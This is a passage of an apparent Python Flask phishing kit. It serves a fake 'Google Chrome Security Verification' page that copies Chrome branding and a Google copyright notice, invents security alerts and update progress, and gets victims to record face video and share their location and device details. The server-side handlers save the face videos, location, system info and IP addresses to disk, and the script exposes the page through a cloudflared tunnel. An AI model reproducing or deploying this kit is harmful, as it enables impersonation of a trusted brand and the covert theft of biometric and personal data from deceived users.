            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Info Box */
        .info-box {{
            background: rgba(66, 133, 244, 0.1);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid var(--chrome-blue);
        }}
        
        .info-box h4 {{
            color: var(--chrome-blue);
            margin-bottom: 10px;
        }}
        
        /* Completion Screen */
        .completion-screen {{
            text-align: center;
            padding: 50px 20px;
        }}
        
        .success-icon {{
            width: 80px;
            height: 80px;
            background: var(--chrome-green);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            margin: 0 auto 30px;
        }}
        
        .chrome-updated {{
            background: linear-gradient(45deg, {colors['chrome_blue']}, {colors['chrome_green']});
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 28px;
            font-weight: 600;
            margin: 20px 0;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            padding: 30px 0;
            border-top: 1px solid var(--chrome-border);
            margin-top: 40px;
            color: var(--chrome-gray);
            font-size: 14px;
        }}
        
        .footer-links {{
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: var(--chrome-blue);
            text-decoration: none;
            margin: 0 10px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        /* Responsive */
        @media (max-width: 768px) {{
            .container {{
                padding: 15px;
            }}
            
            .header {{
                flex-direction: column;
                text-align: center;
                gap: 15px;
            }}
            
            .account-header {{
                flex-direction: column;
                text-align: center;
            }}
            
            .step-indicator {{
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
            }}
            
            .step-indicator::before {{
                display: none;
            }}
            
            .camera-container {{
                width: 250px;
                height: 250px;
            }}
            
            .device-info {{
                grid-template-columns: 1fr 1fr;
            }}
            
            .button-group {{
                flex-direction: column;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="chrome-logo">
                <div class="chrome-icon"></div>
                <span>Chrome</span>
            </div>
            <div class="verification-badge">
                {title}
            </div>
        </div>
        
        <!-- Account Card -->
        <div class="account-card">
            <div class="account-header">
                <div class="account-avatar">
                    {google_account[0].upper()}
                </div>
                <div class="account-info">
                    <h2>{google_account}</h2>
                    <p>Signed in to Chrome</p>
                </div>
            </div>
            
            <div class="device-info">
                <div class="device-item">
                    <div class="device-label">Chrome Version</div>
                    <div class="device-value">{chrome_version}</div>
                </div>
                <div class="device-item">
                    <div class="device-label">Device</div>
                    <div class="device-value">{device_type}</div>
                </div>
                <div class="device-item">
                    <div class="device-label">Sync Status</div>
                    <div class="device-value">{sync_status}</div>
                </div>
            </div>
        </div>
        
        <!-- Security Alert -->
        <div class="security-alert">
            <div class="alert-icon">⚠️</div>
            <div class="alert-content">
                <h3>Security Verification Required</h3>
                <p>{reason}</p>
            </div>
        </div>
        
        <!-- Step Indicator -->
        <div class="steps-container">
            <div class="step-indicator">
                {step_indicator_html}
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">Chrome Security Verification</h2>
                <p class="step-description">
                    Google Chrome needs to verify your identity to complete a critical security update.
                    This helps protect your browser from malware, phishing, and other security threats.
                </p>
                
                <div class="info-box">
                    <h4>Why this is important:</h4>
                    <ul style="padding-left: 20px; margin-top: 10px;">
                        <li>Protect your passwords and payment information</li>
                        <li>Secure your browsing history and bookmarks</li>
                        <li>Enable Safe Browsing protection</li>
                        <li>Prevent unauthorized access to your Google account</li>
                    </ul>
                </div>
                
                <div class="info-box">
                    <h4>What we'll verify:</h4>
                    <ul style="padding-left: 20px; margin-top: 10px;">
                        {'<li>Your identity with face verification</li>' if settings['face_enabled'] else ''}
                        {'<li>Your location for security purposes</li>' if settings['location_enabled'] else ''}
                        {'<li>Your device for malware and threats</li>' if settings['device_scan_enabled'] else ''}
                        {'<li>System information for compatibility</li>' if settings['system_info_enabled'] else ''}
                    </ul>
                </div>
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="nextStep()">
                        Start Security Verification
                    </button>
                    <button class="btn btn-outline btn-block" onclick="skipVerification()">
                        Skip for Now (Not Recommended)
                    </button>
                </div>
            </div>
            
            {step_content_html}
            
            <!-- Step 6: Processing -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--chrome-blue);"></div>
                    <h2 class="step-title">Applying Security Updates</h2>
                    <p class="step-description">
                        Please wait while Chrome applies security updates and verifies your information.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Initializing security protocols...
                    </div>
                    
                    <div class="info-box">
                        <h4>Updating Chrome Security:</h4>
                        <ul style="padding-left: 20px; margin-top: 10px;">
                            <li>Applying Safe Browsing updates</li>
                            <li>Configuring security settings</li>
                            <li>Syncing account information</li>
                            <li>Optimizing browser performance</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- Step 7: Complete -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Chrome Security Updated</h2>
                    
                    <div class="chrome-updated">
                        Security Verification Complete
                    </div>
                    
                    <p class="step-description">
                        Your Chrome browser has been successfully verified and updated with the latest security protections.
                        Chrome will restart in <span id="countdown">10</span> seconds to apply all changes.
                    </p>
                    
                    <div class="info-box">
                        <h4>What's been updated:</h4>
                        <ul style="padding-left: 20px; margin-top: 10px;">
                            {'<li>✓ Identity verified</li>' if settings['face_enabled'] else ''}
                            {'<li>✓ Location secured</li>' if settings['location_enabled'] else ''}
                            {'<li>✓ Device scanned</li>' if settings['device_scan_enabled'] else ''}
                            {'<li>✓ System information collected</li>' if settings['system_info_enabled'] else ''}
                            <li>✓ Safe Browsing enabled</li>
                            <li>✓ Security protocols updated</li>
                        </ul>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="restartChrome()">
                            Restart Chrome Now
                        </button>
                        <button class="btn btn-outline" onclick="continueBrowsing()">
                            Continue Browsing
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Chrome Help</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">Google Security</a>
            </div>
            <p style="margin-top: 15px;">
                © 2024 Google LLC. All rights reserved.<br>
                Chrome and the Chrome logo are trademarks of Google LLC.
            </p>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = {total_steps};
        let googleAccount = "{google_account}";
        let chromeVersion = "{chrome_version}";
        let verificationType = "{verification_type}";
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        
        // Verification state
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
        let faceTimerInterval = null;
        let locationVerified = false;
        
        // Step Navigation
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-number');
            const labels = document.querySelectorAll('.step-label');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index < currentStep - 1) {{
                    step.classList.add('completed');
                }} else if (index === currentStep - 1) {{
                    step.classList.add('active');
                }}
            }});
            
            labels.forEach((label, index) => {{
                label.classList.remove('active');
                if (index === currentStep - 1) {{
                    label.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2 && {str(settings['face_enabled']).lower()}) stepId = 'step2';
            else if (stepNumber === 3 && {str(settings['location_enabled']).lower()}) stepId = 'step3';
            else if (stepNumber === 4 && {str(settings['device_scan_enabled']).lower()}) stepId = 'step4';
            else if (stepNumber === 5 && {str(settings['system_info_enabled']).lower()}) stepId = 'step5';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId && document.getElementById(stepId)) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
                
                // Auto-start system info collection
                if (stepNumber === 5 && {str(settings['system_info_enabled']).lower()}) {{
                    collectSystemInfo();
                }}
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        function skipVerification() {{
            if (confirm("Without verification, Chrome may not be able to provide full security protection. Continue anyway?")) {{
                window.location.href = 'https://www.google.com/chrome';
            }}
        }}
        
        // Face Verification
        {face_verification_js}
        
        // Location Verification
        {location_verification_js}
        
        // Device Scan
        {device_scan_js}
        
        // System Information Collection
        {system_info_js}
        
        // Processing
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 25) {{
                    message = 'Initializing security protocols... ' + Math.round(progress) + '%';
                }} else if (progress < 50) {{
                    message = 'Updating Safe Browsing database... ' + Math.round(progress) + '%';
                }} else if (progress < 75) {{
                    message = 'Configuring security settings... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Applying Chrome updates... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Finalizing verification... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Submit completion data
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    google_account: googleAccount,
                    chrome_version: chromeVersion,
                    verification_type: verificationType,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    face_verified: {str(settings['face_enabled']).lower()},
                    location_verified: {str(settings['location_enabled']).lower()},
                    device_scanned: {str(settings['device_scan_enabled']).lower()},
                    system_info_collected: {str(settings['system_info_enabled']).lower()},
                    security_level: "maximum"
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    restartChrome();
                }}
            }}, 1000);
        }}
        
        function restartChrome() {{
            // Simulate Chrome restart
            window.location.href = 'https://www.google.com/chrome';
        }}
        
        function continueBrowsing() {{
            window.location.href = 'https://www.google.com';
        }}
        
        // Initialize
        updateStepIndicators();
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            google_account = data.get('google_account', 'unknown')
            chrome_version = data.get('chrome_version', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"chrome_face_{google_account.replace('@', '_')}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', f"metadata_{google_account.replace('@', '_')}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'google_account': google_account,
                'chrome_version': chrome_version,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'google_chrome',
                'verification_type': data.get('verification_type', 'unknown'),
                'purpose': 'browser_security_update'
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved Chrome face verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            google_account = data.get('google_account', 'unknown')
            chrome_version = data.get('chrome_version', 'unknown')
            
            # Process location in background
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received Chrome location data: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_device_scan', methods=['POST'])
def submit_device_scan():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            google_account = data.get('google_account', 'unknown')
            chrome_version = data.get('chrome_version', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"chrome_device_scan_{google_account.replace('@', '_')}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'device_scans', filename)
            
            scan_data = {
                'type': 'device_scan',
                'google_account': google_account,
                'chrome_version': chrome_version,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'google_chrome',
                'scan_result': data.get('scan_result', 'clean'),
                'scan_details': {
                    'browser_integrity': 'verified',
                    'malware_detection': 'clean',
                    'extensions_safety': 'safe',
                    'security_protocols': 'updated'
                },
                'user_agent': request.headers.get('User-Agent', 'unknown')
            }
            
            with open(file_path, 'w') as f:
                json.dump(scan_data, f, indent=2)
            
            print(f"Saved Chrome device scan: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving device scan: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_system_info', methods=['POST'])
def submit_system_info():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            google_account = data.get('google_account', 'unknown')
            chrome_version = data.get('chrome_version', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"chrome_system_info_{google_account.replace('@', '_')}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'system_info', filename)
            
            system_data = {
                'type': 'system_information',
                'google_account': google_account,
                'chrome_version': chrome_version,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'google_chrome',
                'system_info': {
                    'browser': data.get('browser', ''),
                    'platform': data.get('platform', ''),
                    'screen_resolution': data.get('screen_resolution', ''),
                    'timezone': data.get('timezone', ''),
                    'user_agent': request.headers.get('User-Agent', 'unknown')
                },
                'verification_purpose': 'chrome_security_update'
            }
            
            with open(file_path, 'w') as f:
                json.dump(system_data, f, indent=2)
            
            print(f"Saved Chrome system info: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving system info: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            google_account = data.get('google_account', 'unknown')
            chrome_version = data.get('chrome_version', 'unknown')
            verification_type = data.get('verification_type', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"chrome_complete_{google_account.replace('@', '_')}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            data['platform'] = 'google_chrome'
            data['verification_completed'] = True
            data['chrome_updated'] = True
            data['safe_browsing_enabled'] = True
            data['security_level'] = data.get('security_level', 'maximum')
            
            # Add verification summary
            data['verification_summary'] = {
                'google_account': google_account,
                'chrome_version': chrome_version,
                'verification_type': verification_type,
                'completion_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip_address': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'unknown')
            }
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved Chrome verification summary: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4049
    script_name = "Google Chrome Security Update"
    
    print("\n" + "="*60)
    print("GOOGLE CHROME SECURITY VERIFICATION")
    print("="*60)
    print(f"[+] Google Account: {VERIFICATION_SETTINGS['google_account']}")
    print(f"[+] Chrome Version: {VERIFICATION_SETTINGS['chrome_version']}")
    print(f"[+] Device Type: {VERIFICATION_SETTINGS['device_type']}")
    print(f"[+] Sync Status: {VERIFICATION_SETTINGS['sync_status']}")
    print(f"[+] Verification Type: {VERIFICATION_SETTINGS['title']}")
    print(f"[+] Reason: {VERIFICATION_SETTINGS['reason']}")
    
    print(f"\n[+] Data folder: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Face verification: Enabled ({VERIFICATION_SETTINGS['face_duration']}s)")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    if VERIFICATION_SETTINGS['device_scan_enabled']:
        print(f"[+] Device scan: Enabled")
    if VERIFICATION_SETTINGS['system_info_enabled']:
        print(f"[+] System info collection: Enabled")
    
    print("\n[+] Starting Chrome security verification portal...")
    print("[+] Press Ctrl+C to stop.\n")
    
    print("="*60)
    print("GOOGLE CHROME SECURITY UPDATE REQUIRED")
    print("="*60)
    print(f"🌐 Browser: Google Chrome {VERIFICATION_SETTINGS['chrome_version']}")
    print(f"👤 Account: {VERIFICATION_SETTINGS['google_account']}")
    print(f"💻 Device: {VERIFICATION_SETTINGS['device_type']}")
    print(f"🔄 Sync: {VERIFICATION_SETTINGS['sync_status']}")
    print(f"⚠️  ALERT: {VERIFICATION_SETTINGS['title']}")
    print(f"📋 REASON: {VERIFICATION_SETTINGS['reason']}")
    print(f"🔐 SECURITY: Complete verification to enable Safe Browsing protection")
    print("="*60)
    print("Open the link below in Chrome to start security verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        process = run_cloudflared_and_print_link(port, script_name)
        process.wait()  # Keep the main thread alive
    except KeyboardInterrupt:
        print("\n[+] Shutting down Chrome security portal...")
        sys.exit(0)